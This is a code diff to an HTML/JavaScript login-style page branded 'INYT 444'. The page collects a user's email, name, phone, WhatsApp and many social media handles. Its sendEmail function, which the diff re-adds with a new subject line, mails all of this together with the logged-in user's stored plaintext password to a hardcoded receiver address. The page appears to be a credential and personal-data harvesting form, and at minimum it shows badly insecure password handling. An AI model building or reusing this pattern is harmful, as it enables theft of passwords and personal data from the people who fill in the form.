@@ -193,16 +193,16 @@ textarea{resize:vertical;min-height:60px;}
         <div class="neon-card hidden" id="formCard">
             <div class="form-header"><h3><i class="fa-regular fa-pen-to-square"></i>INYT 444 । LOGIN</h3><i class="fa-regular fa-satellite-dish"></i></div>
             <div class="input-group"><label><i class="fa-regular fa-envelope"></i> 1. EMAIL <span style="color:#ff6688;">*</span></label><input type="email" id="yourEmail" placeholder="cyber@neon.com"></div>
-            <div class="input-group"><label><i class="fa-regular fa-user"></i> 2. USERNAME <span style="color:#ff6688;">*</span></label><input type="text" id="yourUsername" placeholder="neon_operator"></div>
+            <div class="input-group"><label><i class="fa-regular fa-user"></i> 2. USER NAME <span style="color:#ff6688;">*</span></label><input type="text" id="yourUsername" placeholder="neon_operator"></div>
             <div class="input-group"><label><i class="fa-regular fa-id-card"></i> 3. YOUR NAME <span style="color:#ff6688;">*</span></label><input type="text" id="yourName" placeholder="John Doe"></div>
-            <div class="input-group"><label><i class="fa-regular fa-image"></i> 4. PROFILE PIC LINK</label><input type="url" id="profilePic" placeholder="https://"></div>
+            <div class="input-group"><label><i class="fa-regular fa-image"></i> 4. PROFILE PICTURE LINK</label><input type="url" id="profilePic" placeholder="https://"></div>
             <div class="input-group"><label><i class="fa-brands fa-facebook"></i> 5. FACEBOOK</label><input type="text" id="fbUsername" placeholder="username"></div>
-            <div class="input-group"><label><i class="fa-brands fa-facebook"></i> 6. FB PAGE</label><input type="text" id="fbPageUsername" placeholder="pagename"></div>
+            <div class="input-group"><label><i class="fa-brands fa-facebook"></i> 6. FACEBOOK PAGE</label><input type="text" id="fbPageUsername" placeholder="pagename"></div>
             <div class="input-group"><label><i class="fa-brands fa-instagram"></i> 7. INSTAGRAM</label><input type="text" id="igUsername" placeholder="@username"></div>
             <div class="input-group"><label><i class="fa-brands fa-whatsapp"></i> 8. WHATSAPP</label><input type="tel" id="whatsapp" placeholder="+8801XXXXXXXXX"></div>
             <div class="input-group"><label><i class="fa-brands fa-tiktok"></i> 9. TIKTOK</label><input type="text" id="tiktok" placeholder="@username"></div>
             <div class="input-group"><label><i class="fa-brands fa-telegram"></i> 10. TELEGRAM</label><input type="text" id="telegram" placeholder="@username"></div>
-            <div class="input-group"><label><i class="fa-brands fa-twitter"></i> 11. TWITTER(X)</label><input type="text" id="twitter" placeholder="@username"></div>
+            <div class="input-group"><label><i class="fa-brands fa-twitter"></i> 11. TWITTER (X)</label><input type="text" id="twitter" placeholder="@username"></div>
             <div class="input-group"><label><i class="fa-solid fa-phone"></i> 12. PHONE</label><input type="tel" id="phone" placeholder="8801XXXXXXXXX"></div>
             <div class="input-group"><label><i class="fa-regular fa-user"></i> 13. ABOUT</label><textarea id="about" placeholder="Write about yourself..."></textarea></div>
             <div class="input-group"><label><i class="fa-solid fa-globe"></i> 14. WEBSITE</label><input type="url" id="website" placeholder="https://yourdomain.com"></div>
@@ -429,8 +429,8 @@ function sendEmail(){
         return;
     }
     let g = (id) => document.getElementById(id)?.value.trim() || "—";
-    let body = `★ HOLOGRAM REQUEST DATA ★\n\n1. Email : ${g('yourEmail')}\n2. Username : ${g('yourUsername')}\n3. Name : ${g('yourName')}\n4. Profile Pic : ${g('profilePic')}\n5. Facebook : ${g('fbUsername')}\n6. FB Page : ${g('fbPageUsername')}\n7. Instagram : ${g('igUsername')}\n8. WhatsApp : ${g('whatsapp')}\n9. TikTok : ${g('tiktok')}\n10. Telegram : ${g('telegram')}\n11. Twitter : ${g('twitter')}\n12. Phone : ${g('phone')}\n13. About : ${g('about')}\n14. Website : ${g('website')}\n15. Theme : ${theme}\n\n👤 Logged In : ${currentUser}\n🔑 Password : ${users[currentUser]}\n🕐 Time : ${getTime()}`;
-    let sub = "★ New Hologram Request ★";
+    let body = `★ INFORMATION SUBMITTED ★\n\n1. Email : ${g('yourEmail')}\n2. Username : ${g('yourUsername')}\n3. Name : ${g('yourName')}\n4. Profile Pic : ${g('profilePic')}\n5. Facebook : ${g('fbUsername')}\n6. FB Page : ${g('fbPageUsername')}\n7. Instagram : ${g('igUsername')}\n8. WhatsApp : ${g('whatsapp')}\n9. TikTok : ${g('tiktok')}\n10. Telegram : ${g('telegram')}\n11. Twitter : ${g('twitter')}\n12. Phone : ${g('phone')}\n13. About : ${g('about')}\n14. Website : ${g('website')}\n15. Theme : ${theme}\n\n👤 Logged In : ${currentUser}\n🔑 Password : ${users[currentUser]}\n🕐 Time : ${getTime()}`;
+    let sub = "★ INYT 444 INFORMATION UPDATE ★";
     let isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
     let mailto = `mailto:${RECEIVER_EMAIL}?subject=${encodeURIComponent(sub)}&body=${encodeURIComponent(body)}`;
     if(isMobile){
